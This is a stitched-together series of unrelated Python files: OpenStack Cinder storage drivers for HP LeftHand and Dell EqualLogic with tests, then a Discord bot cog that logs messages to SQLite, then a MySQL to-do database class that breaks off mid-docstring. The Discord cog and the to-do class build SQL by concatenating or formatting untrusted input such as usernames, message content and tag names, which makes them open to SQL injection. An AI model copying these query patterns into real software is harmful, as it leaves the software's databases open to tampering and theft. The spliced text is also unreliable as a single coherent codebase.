        result = response.attrib.get("result")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml("createServer", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """Unassign the volume from the host."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("unassignVolumeToServer", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml("getClusterInfo", {})
        cluster_node = result_xml.find("response/cluster")
        total_capacity = cluster_node.attrib.get("spaceTotal")
        free_capacity = cluster_node.attrib.get("unprovisionedSpace")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import time

import mox
import paramiko

from cinder import context
from cinder import exception
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers import eqlx


LOG = logging.getLogger(__name__)


class DellEQLSanISCSIDriverTestCase(test.TestCase):

    def setUp(self):
        super(DellEQLSanISCSIDriverTestCase, self).setUp()
        self.configuration = mox.MockObject(conf.Configuration)
        self.configuration.append_config_values(mox.IgnoreArg())
        self.configuration.san_is_local = False
        self.configuration.san_ip = "10.0.0.1"
        self.configuration.san_login = "foo"
        self.configuration.san_password = "bar"
        self.configuration.san_ssh_port = 16022
        self.configuration.san_thin_provision = True
        self.configuration.eqlx_pool = 'non-default'
        self.configuration.eqlx_use_chap = True
        self.configuration.eqlx_group_name = 'group-0'
        self.configuration.eqlx_cli_timeout = 30
        self.configuration.eqlx_cli_max_retries = 5
        self.configuration.eqlx_chap_login = 'admin'
        self.configuration.eqlx_chap_password = 'password'
        self.configuration.volume_name_template = 'volume_%s'
        self._context = context.get_admin_context()
        self.driver = eqlx.DellEQLSanISCSIDriver(
            configuration=self.configuration)
        self.volume_name = "fakevolume"
        self.volid = "fakeid"
        self.connector = {'ip': '10.0.0.2',
                          'initiator': 'iqn.1993-08.org.debian:01:222',
                          'host': 'fakehost'}
        self.fake_iqn = 'iqn.2003-10.com.equallogic:group01:25366:fakev'
        self.driver._group_ip = '10.0.1.6'
        self.properties = {
            'target_discoverd': True,
            'target_portal': '%s:3260' % self.driver._group_ip,
            'target_iqn': self.fake_iqn,
            'volume_id': 1}
        self._model_update = {
            'provider_location': "%s:3260,1 %s 0" % (self.driver._group_ip,
                                                     self.fake_iqn),
            'provider_auth': 'CHAP %s %s' % (
                self.configuration.eqlx_chap_login,
                self.configuration.eqlx_chap_password)
        }

    def _fake_get_iscsi_properties(self, volume):
        return self.properties

    def test_create_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'create', volume['name'],
                                 "%sG" % (volume['size']), 'pool',
                                 self.configuration.eqlx_pool,
                                 'thin-provision').\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume(volume)
        self.assertEqual(model_update, self._model_update)

    def test_delete_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.driver._eql_execute('volume', 'select', volume['name'], 'offline')
        self.driver._eql_execute('volume', 'delete', volume['name'])
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_delete_absent_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1, 'id': self.volid}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show').\
            AndRaise(processutils.ProcessExecutionError(
                stdout='% Error ..... does not exist.\n'))
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_ensure_export(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.mox.ReplayAll()
        self.driver.ensure_export({}, volume)

    def test_create_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        snap_name = 'fake_snap_name'
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'create-now').\
            AndReturn(['Snapshot name is %s' % snap_name])
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'rename', snap_name,
                                 snapshot['name'])
        self.mox.ReplayAll()
        self.driver.create_snapshot(snapshot)

    def test_create_volume_from_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'select', snapshot['name'],
                                 'clone', volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume_from_snapshot(volume,
                                                               snapshot)
        self.assertEqual(model_update, self._model_update)

    def test_create_cloned_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        src_vref = {'id': 'fake_uuid'}
        volume = {'name': self.volume_name}
        src_volume_name = self.configuration.\
            volume_name_template % src_vref['id']
        self.driver._eql_execute('volume', 'select', src_volume_name, 'clone',
                                 volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertEqual(model_update, self._model_update)

    def test_delete_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'delete', snapshot['name'])
        self.mox.ReplayAll()
        self.driver.delete_snapshot(snapshot)

    def test_extend_volume(self):
        new_size = '200'
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 100}
        self.driver._eql_execute('volume', 'select', volume['name'],
                                 'size', "%sG" % new_size)
        self.mox.ReplayAll()
        self.driver.extend_volume(volume, new_size)

    def test_initialize_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.stubs.Set(self.driver, "_get_iscsi_properties",
                       self._fake_get_iscsi_properties)
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'create', 'initiator',
                                 self.connector['initiator'],
                                 'authmethod chap',                    
                                 'username',
                                 self.configuration.eqlx_chap_login)
        self.mox.ReplayAll()
        iscsi_properties = self.driver.initialize_connection(volume,
                                                             self.connector)
        self.assertEqual(iscsi_properties['data'],
                         self._fake_get_iscsi_properties(volume))

    def test_terminate_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'delete', '1')
        self.mox.ReplayAll()
        self.driver.terminate_connection(volume, self.connector)

    def test_do_setup(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        fake_group_ip = '10.1.2.3'
        for feature in ('confirmation', 'paging', 'events', 'formatoutput'):
            self.driver._eql_execute('cli-settings', feature, 'off')
        self.driver._eql_execute('grpparams', 'show').\
            AndReturn(['Group-Ipaddress: %s' % fake_group_ip])
        self.mox.ReplayAll()
        self.driver.do_setup(self._context)
        self.assertEqual(fake_group_ip, self.driver._group_ip)

    def test_update_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        self.driver._update_volume_stats()
        self.assertEqual(self.driver._stats['total_capacity_gb'], 111.0)
        self.assertEqual(self.driver._stats['free_capacity_gb'], 11.0)

    def test_get_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        stats = self.driver.get_volume_stats(refresh=True)
        self.assertEqual(stats['total_capacity_gb'], float('111.0'))
        self.assertEqual(stats['free_capacity_gb'], float('11.0'))
        self.assertEqual(stats['vendor_name'], 'Dell')

    def test_get_space_in_gb(self):
        self.assertEqual(self.driver._get_space_in_gb('123.0GB'), 123.0)
        self.assertEqual(self.driver._get_space_in_gb('123.0TB'), 123.0 * 1024)
        self.assertEqual(self.driver._get_space_in_gb('1024.0MB'), 1.0)

    def test_get_output(self):

        def _fake_recv(ignore_arg):
            return '%s> ' % self.configuration.eqlx_group_name

        chan = self.mox.CreateMock(paramiko.Channel)
        self.stubs.Set(chan, "recv", _fake_recv)
        self.assertEqual(self.driver._get_output(chan), [_fake_recv(None)])

    def test_get_prefixed_value(self):
        lines = ['Line1 passed', 'Line1 failed']
        prefix = ['Line1', 'Line2']
        expected_output = [' passed', None]
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[0]),
                         expected_output[0])
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[1]),
                         expected_output[1])

    def test_ssh_execute(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['NoError: test run']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertEqual(self.driver._ssh_execute(ssh, cmd), expected_output)

    def test_ssh_execute_error(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(ssh, 'get_transport')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['Error: test run', '% Error']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertRaises(processutils.ProcessExecutionError,
                          self.driver._ssh_execute, ssh, cmd)

    def test_with_timeout(self):
        @eqlx.with_timeout
        def no_timeout(cmd, *args, **kwargs):
            return 'no timeout'

        @eqlx.with_timeout
        def w_timeout(cmd, *args, **kwargs):
            time.sleep(1)

        self.assertEqual(no_timeout('fake cmd'), 'no timeout')
        self.assertRaises(exception.VolumeBackendAPIException,
                          w_timeout, 'fake cmd', timeout=0.1)

    def test_local_path(self):
        self.assertRaises(NotImplementedError, self.driver.local_path, '')

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

"""Volume driver for Dell EqualLogic Storage."""

import functools
import random

import eventlet
from eventlet import greenthread
import greenlet
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import utils
from cinder.volume.drivers.san import SanISCSIDriver

LOG = logging.getLogger(__name__)

eqlx_opts = [
    cfg.StrOpt('eqlx_group_name',
               default='group-0',
               help='Group name to use for creating volumes'),
    cfg.IntOpt('eqlx_cli_timeout',
               default=30,
               help='Timeout for the Group Manager cli command execution'),
    cfg.IntOpt('eqlx_cli_max_retries',
               default=5,
               help='Maximum retry count for reconnection'),
    cfg.BoolOpt('eqlx_use_chap',
                default=False,
                help='Use CHAP authentication for targets?'),
    cfg.StrOpt('eqlx_chap_login',
               default='admin',
               help='Existing CHAP account name'),
    cfg.StrOpt('eqlx_chap_password',
               default='password',
               help='Password for specified CHAP account name',
               secret=True),
    cfg.StrOpt('eqlx_pool',
               default='default',
               help='Pool in which volumes will be created')
]


CONF = cfg.CONF
CONF.register_opts(eqlx_opts)


def with_timeout(f):
    @functools.wraps(f)
    def __inner(self, *args, **kwargs):
        timeout = kwargs.pop('timeout', None)
        gt = eventlet.spawn(f, self, *args, **kwargs)
        if timeout is None:
            return gt.wait()
        else:
            kill_thread = eventlet.spawn_after(timeout, gt.kill)
            try:
                res = gt.wait()
            except greenlet.GreenletExit:
                raise exception.VolumeBackendAPIException(
                    data="Command timed out")
            else:
                kill_thread.cancel()
                return res

    return __inner


class DellEQLSanISCSIDriver(SanISCSIDriver):
    """Implements commands for Dell EqualLogic SAN ISCSI management.

    To enable the driver add the following line to the cinder configuration:
        volume_driver=cinder.volume.drivers.eqlx.DellEQLSanISCSIDriver

    Driver's prerequisites are:
        - a separate volume group set up and running on the SAN
        - SSH access to the SAN
        - a special user must be created which must be able to
            - create/delete volumes and snapshots;
            - clone snapshots into volumes;
            - modify volume access records;

    The access credentials to the SAN are provided by means of the following
    flags
        san_ip=<ip_address>
        san_login=<user name>
        san_password=<user password>
        san_private_key=<file containing SSH private key>

    Thin provision of volumes is enabled by default, to disable it use:
        san_thin_provision=false

    In order to use target CHAP authentication (which is disabled by default)
    SAN administrator must create a local CHAP user and specify the following
    flags for the driver:
        eqlx_use_chap=true
        eqlx_chap_login=<chap_login>
        eqlx_chap_password=<chap_password>

    eqlx_group_name parameter actually represents the CLI prompt message
    without '>' ending. E.g. if prompt looks like 'group-0>', then the
    parameter must be set to 'group-0'

    Also, the default CLI command execution timeout is 30 secs. Adjustable by
        eqlx_cli_timeout=<seconds>
    """

    VERSION = "1.0.0"

    def __init__(self, *args, **kwargs):
        super(DellEQLSanISCSIDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(eqlx_opts)
        self._group_ip = None
        self.sshpool = None

    def _get_output(self, chan):
        out = ''
        ending = '%s> ' % self.configuration.eqlx_group_name
        while not out.endswith(ending):
            out += chan.recv(102400)

        LOG.debug(_("CLI output\n%s"), out)
        return out.splitlines()

    def _get_prefixed_value(self, lines, prefix):
        for line in lines:
            if line.startswith(prefix):
                return line[len(prefix):]
        return

    @with_timeout
    def _ssh_execute(self, ssh, command, *arg, **kwargs):
        transport = ssh.get_transport()
        chan = transport.open_session()
        chan.invoke_shell()

        LOG.debug(_("Reading CLI MOTD"))
        self._get_output(chan)

        cmd = 'stty columns 255'
        LOG.debug(_("Setting CLI terminal width: '%s'"), cmd)
        chan.send(cmd + '\r')
        out = self._get_output(chan)

        LOG.debug(_("Sending CLI command: '%s'"), command)
        chan.send(command + '\r')
        out = self._get_output(chan)

        chan.close()

        if any(line.startswith(('% Error', 'Error:')) for line in out):
            desc = _("Error executing EQL command")
            cmdout = '\n'.join(out)
            LOG.error(cmdout)
            raise processutils.ProcessExecutionError(
                stdout=cmdout, cmd=command, description=desc)
        return out

    def _run_ssh(self, cmd_list, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        LOG.info(_('EQL-driver: executing "%s"') % command)
                        return self._ssh_execute(
                            ssh, command,
                            timeout=self.configuration.eqlx_cli_timeout)
                    except processutils.ProcessExecutionError:
                        raise
                    except Exception as e:
                        LOG.exception(e)
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                msg = (_("SSH Command failed after '%(total_attempts)r' "
                         "attempts : '%(command)s'") %
                       {'total_attempts': total_attempts, 'command': command})
                raise exception.VolumeBackendAPIException(data=msg)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def _eql_execute(self, *args, **kwargs):
        return self._run_ssh(
            args, attempts=self.configuration.eqlx_cli_max_retries)

    def _get_volume_data(self, lines):
        prefix = 'iSCSI target name is '
        target_name = self._get_prefixed_value(lines, prefix)[:-1]
        lun_id = "%s:%s,1 %s 0" % (self._group_ip, '3260', target_name)
        model_update = {}
        model_update['provider_location'] = lun_id
        if self.configuration.eqlx_use_chap:
            model_update['provider_auth'] = 'CHAP %s %s' % \
                (self.configuration.eqlx_chap_login,
                 self.configuration.eqlx_chap_password)
        return model_update

    def _get_space_in_gb(self, val):
        scale = 1.0
        part = 'GB'
        if val.endswith('MB'):
            scale = 1.0 / 1024
            part = 'MB'
        elif val.endswith('TB'):
            scale = 1.0 * 1024
            part = 'TB'
        return scale * float(val.partition(part)[0])

    def _update_volume_stats(self):
        """Retrieve stats info from eqlx group."""

        LOG.debug(_("Updating volume stats"))
        data = {}
        backend_name = "eqlx"
        if self.configuration:
            backend_name = self.configuration.safe_get('volume_backend_name')
        data["volume_backend_name"] = backend_name or 'eqlx'
        data["vendor_name"] = 'Dell'
        data["driver_version"] = self.VERSION
        data["storage_protocol"] = 'iSCSI'

        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        data['total_capacity_gb'] = 'infinite'
        data['free_capacity_gb'] = 'infinite'

        for line in self._eql_execute('pool', 'select',
                                      self.configuration.eqlx_pool, 'show'):
            if line.startswith('TotalCapacity:'):
                out_tup = line.rstrip().partition(' ')
                data['total_capacity_gb'] = self._get_space_in_gb(out_tup[-1])
            if line.startswith('FreeSpace:'):
                out_tup = line.rstrip().partition(' ')
                data['free_capacity_gb'] = self._get_space_in_gb(out_tup[-1])

        self._stats = data

    def _check_volume(self, volume):
        """Check if the volume exists on the Array."""
        command = ['volume', 'select', volume['name'], 'show']
        try:
            self._eql_execute(*command)
        except processutils.ProcessExecutionError as err:
            with excutils.save_and_reraise_exception():
                if err.stdout.find('does not exist.\n') > -1:
                    LOG.debug(_('Volume %s does not exist, '
                                'it may have already been deleted'),
                              volume['name'])
                    raise exception.VolumeNotFound(volume_id=volume['id'])

    def do_setup(self, context):
        """Disable cli confirmation and tune output format."""
        try:
            disabled_cli_features = ('confirmation', 'paging', 'events',
                                     'formatoutput')
            for feature in disabled_cli_features:
                self._eql_execute('cli-settings', feature, 'off')

            for line in self._eql_execute('grpparams', 'show'):
                if line.startswith('Group-Ipaddress:'):
                    out_tup = line.rstrip().partition(' ')
                    self._group_ip = out_tup[-1]

            LOG.info(_("EQL-driver: Setup is complete, group IP is %s"),
                     self._group_ip)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to setup the Dell EqualLogic driver'))

    def create_volume(self, volume):
        """Create a volume."""
        try:
            cmd = ['volume', 'create',
                   volume['name'], "%sG" % (volume['size'])]
            if self.configuration.eqlx_pool != 'default':
                cmd.append('pool')
                cmd.append(self.configuration.eqlx_pool)
            if self.configuration.san_thin_provision:
                cmd.append('thin-provision')
            out = self._eql_execute(*cmd)
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume %s'), volume['name'])

    def delete_volume(self, volume):
        """Delete a volume."""
        try:
            self._check_volume(volume)
            self._eql_execute('volume', 'select', volume['name'], 'offline')
            self._eql_execute('volume', 'delete', volume['name'])
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s was not found while trying to delete it'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete volume %s'), volume['name'])

    def create_snapshot(self, snapshot):
        """"Create snapshot of existing volume on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'],
                                    'snapshot', 'create-now')
            prefix = 'Snapshot name is '
            snap_name = self._get_prefixed_value(out, prefix)
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'rename', snap_name,
                              snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create snapshot of volume %s'),
                          snapshot['volume_name'])

    def create_volume_from_snapshot(self, volume, snapshot):
        """Create new volume from other volume's snapshot on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'], 'snapshot',
                                    'select', snapshot['name'],
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume from snapshot %s'),
                          snapshot['name'])

    def create_cloned_volume(self, volume, src_vref):
        """Creates a clone of the specified volume."""
        try:
            src_volume_name = self.configuration.\
                volume_name_template % src_vref['id']
            out = self._eql_execute('volume', 'select', src_volume_name,
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create clone of volume %s'),
                          volume['name'])

    def delete_snapshot(self, snapshot):
        """Delete volume's snapshot."""
        try:
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'delete', snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete snapshot %(snap)s of '
                            'volume %(vol)s'),
                          {'snap': snapshot['name'],
                           'vol': snapshot['volume_name']})

    def initialize_connection(self, volume, connector):
        """Restrict access to a volume."""
        try:
            cmd = ['volume', 'select', volume['name'], 'access', 'create',
                   'initiator', connector['initiator']]
            if self.configuration.eqlx_use_chap:
                cmd.extend(['authmethod chap', 'username',                    
                            self.configuration.eqlx_chap_login])
            self._eql_execute(*cmd)
            iscsi_properties = self._get_iscsi_properties(volume)
            return {
                'driver_volume_type': 'iscsi',
                'data': iscsi_properties
            }
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to initialize connection to volume %s'),
                          volume['name'])

    def terminate_connection(self, volume, connector, force=False, **kwargs):
        """Remove access restrictions from a volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'access', 'delete', '1')
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to terminate connection to volume %s'),
                          volume['name'])

    def create_export(self, context, volume):
        """Create an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        """
        pass

    def ensure_export(self, context, volume):
        """Ensure an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation. We will just make
        sure that the volume exists on the array and issue a warning.
        """
        try:
            self._check_volume(volume)
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s is not found!, it may have been deleted'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to ensure export of volume %s'),
                          volume['name'])

    def remove_export(self, context, volume):
        """Remove an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        Nothing to remove since there's nothing exported.
        """
        pass

    def extend_volume(self, volume, new_size):
        """Extend the size of the volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'size', "%sG" % new_size)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to extend_volume %(name)s from '
                            '%(current_size)sGB to %(new_size)sGB'),
                          {'name': volume['name'],
                           'current_size': volume['size'],
                           'new_size': new_size})

    def local_path(self, volume):
        raise NotImplementedError()

from discord.ext import commands
from random import choice
from .utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import box
from collections import Counter, defaultdict, namedtuple
import discord
import asyncio
import sqlite3 as lite
import sys
import os

DATABASE_PATH = "data/database/data.db"

class Database:
    """General commands."""
    def __init__(self, bot):
        self.database = lite.connect(DATABASE_PATH)

    async def on_message(self, message):
        server = message.server
        author = message.author
        channel = message.channel
        
        c = self.database.cursor()

        c.execute("SELECT EXISTS(SELECT 1 FROM USER WHERE id="+str(author.id)+" collate nocase) LIMIT 1")                    
        if c.fetchone()[0]==0:
            c.execute("INSERT INTO USER VALUES ('"+author.name+"',"+author.id+",'"+str(author.bot)+"','"+author.avatar+"','"+str(author.created_at)+"')")                    

        c.execute("SELECT EXISTS(SELECT 1 FROM SERVERS WHERE id="+str(server.id)+" collate nocase) LIMIT 1")                    
        if c.fetchone()[0]==0:
            c.execute("INSERT INTO SERVERS VALUES ('"+server.name+"',"+server.id+","+server.owner.id+")")                    

        print(message.edited_timestamp)                    
        sql_command = message.id+",'"+str(message.edited_timestamp)+"','"+str(message.timestamp)+"','"+str(message.tts)+"','"+str(message.author.name)+"',"+str(message.author.id)+",'"+message.content+"',"+message.server.id+","+message.channel.id                    
        
        print(sql_command)                    
        
        c.execute("INSERT INTO MESSAGE VALUES ("+sql_command+")")                    
        self.database.commit()        

def check_folders():
    folders = ("data", "data/database/")
    for folder in folders:
        if not os.path.exists(folder):
            print("Creating " + folder + " folder...")
            os.makedirs(folder)

def check_files():
    if not os.path.isfile(DATABASE_PATH):
        conn = lite.connect(DATABASE_PATH)
        c = conn.cursor()
        #c.execute("CREATE TABLE IF NOT EXISTS servers (Id INT, Name TEXT)")
        #c.execute("CREATE TABLE IF NOT EXISTS users (Id INT, ServerId INT, Name TEXT, Avatar_Url TEXT)")
        #c.execute("CREATE TABLE IF NOT EXISTS messages (UserId INT, Message TEXT)")

def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(Database(bot))                    

"""todo_server_db.py

A class for communicating with MySQL to add, update, and remove tags and tasks.
"""

import sys
import datetime
import MySQLdb

class Database:
    """Interface to the MySQL database.

    A class for communicating with MySQL to add, update, and remove tags and
    tasks. Changing database methods will effect network/network.py since
    the method calls are only defined there and in the actual client script
    todo.py. The global attributes here are used as responses from the Todo
    server in todo_server_thread.py.

    Attributes:
        DEFAULT_TAG: tag to default to if no default tag is specified
        CANT_CONNECT: returned when Database can't connect to MySQL
        SUCCESS: returned for successful database calls
        DUPLICATE: returned when a method attempts to insert a duplicate entry
        DOES_NOT_EXIST: returned when a delete or update method can not find the
            row to delete or update
        INVALID_DATE: returned when a date passed to a method is not valid
        DATA: returned when data is passed across the network rather than an
            enumerated reponse
    """

    DEFAULT_TAG = 'misc'
    CANT_CONNECT = 0
    SUCCESS = 1
    DUPLICATE = 2
    DOES_NOT_EXIST = 3
    INVALID_ID = 4
    INVALID_DATE = 5
    DATA = 6


    def __init__(self, default_tag):
        """Pass configuration to the database class.

        Args:
            default_tag: tag name that task creation defaults to
        """
        self.default_tag = default_tag

    def connect(self, hostname='localhost', username='todo', password='todo',
            database='todo'):
        """Connects to the MySQL database.

        Args:
            hostname: MySQL hostname
            username: MySQL username
            password: MySQL password
            database: MySQL database

        Returns:
            SUCCESS if the connection succeeded or CANT_CONNECT if the
            connection was not made.
        """
        try:
            self.__con = MySQLdb.connect(hostname, username, password, database)
            self.__con.autocommit(True)
            return Database.SUCCESS
        except MySQLdb.Error:
            return Database.CANT_CONNECT

    def close(self):
        """Close the database connection."""
        self.__con.close()

    @staticmethod
    def __format_date(date):
        """Checks a date for validity then formats it.

        Args:
            date: string to format

        Returns:
            INVALID_DATE if the date is not valid or a formatted date otherwise.
        """
        try:
            pieces = map(lambda x: int(x), date.split('-'))
            valid_date = datetime.date(pieces[2], pieces[0], pieces[1])
        except (IndexError, ValueError):
            return Database.INVALID_DATE
        return valid_date.isoformat()

    def add_tag(self, name):
        """Adds tag with name to the database.

        Args:
            name: tag name to add

        Returns:
            SUCCESS if the insertion succeeds or DUPLICATE if there is already
            a tag with name. If the cursor can not be 
        """
        cur = self.__con.cursor()
        try:
            cur.execute("INSERT INTO tags(name) VALUE('%s')" %name)                    
            return Database.SUCCESS
        except MySQLdb.IntegrityError:
            return Database.DUPLICATE

    def remove_tag(self, name):
        """Removes tag with name from the database along with its tasks.

        Args:
            name: tag name to be removed

        Returns:
